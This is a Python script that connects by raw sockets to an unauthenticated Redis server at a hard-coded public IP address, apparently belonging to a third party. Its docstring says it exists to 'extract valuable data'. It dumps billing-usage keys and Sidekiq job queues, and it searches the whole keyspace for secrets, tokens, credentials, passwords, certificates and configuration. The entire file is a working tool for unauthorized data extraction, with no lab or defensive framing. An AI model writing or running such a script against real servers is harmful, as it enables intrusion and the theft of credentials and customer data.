#!/usr/bin/env python3
"""Extract valuable data from KZ Redis"""
import socket
import time
import json

HOST = "38.107.234.149"

def redis_cmd(cmd, timeout=3):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((HOST, 6379))
    s.send(cmd.encode() if isinstance(cmd, str) else cmd)
    time.sleep(0.8)
    data = b""
    while True:
        try:
            s.settimeout(1)
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
        except:
            break
    s.close()
    return data.decode(errors="replace")


def redis_get(key):
    raw = redis_cmd("GET {}\r\n".format(key), timeout=4)
    return raw


# 1. charge-usage data
print("=== charge-usage keys ===")
raw = redis_cmd("KEYS charge-usage*\r\n")
for line in raw.split("\r\n"):
    line = line.strip()
    if line and not line.startswith("$") and not line.startswith("*"):
        val = redis_get('"' + line + '"')
        print("  {} -> {}".format(line, val[:200]))

print("\n=== Sidekiq dead queue ===")
# Sidekiq dead set info
raw = redis_cmd("ZREVRANGE sidekiq:dead 0 10 WITHSCORES\r\n", timeout=5)
print(raw[:2000])

print("\n=== Sidekiq stats ===")
raw = redis_cmd("GET sidekiq:stat:failed\r\n")
print("  failed: {}".format(raw.strip()))
raw = redis_cmd("GET sidekiq:stat:processed\r\n")
print("  processed: {}".format(raw.strip()))

print("\n=== Sidekiq processes ===")
raw = redis_cmd("KEYS sidekiq:*\r\n")
for line in raw.split("\r\n"):
    line = line.strip()
    if line and not line.startswith("$") and not line.startswith("*"):
        print("  {}".format(line))

# Additional interesting keys
print("\n=== Additional keys ===")
for pattern in ["*signing*", "*secret*", "*token*", "*cred*", "*password*", "*ssl*", "*cert*", "*env*", "*config*", "*database*", "*db*", "*key*"]:
    raw = redis_cmd("KEYS {}\r\n".format(pattern))
    keys = []
    for line in raw.split("\r\n"):
        line = line.strip()
        if line and not line.startswith("$") and not line.startswith("*"):
            keys.append(line)
    if keys:
        print("  {} ({}): {}".format(pattern, len(keys), ", ".join(keys[:5])))
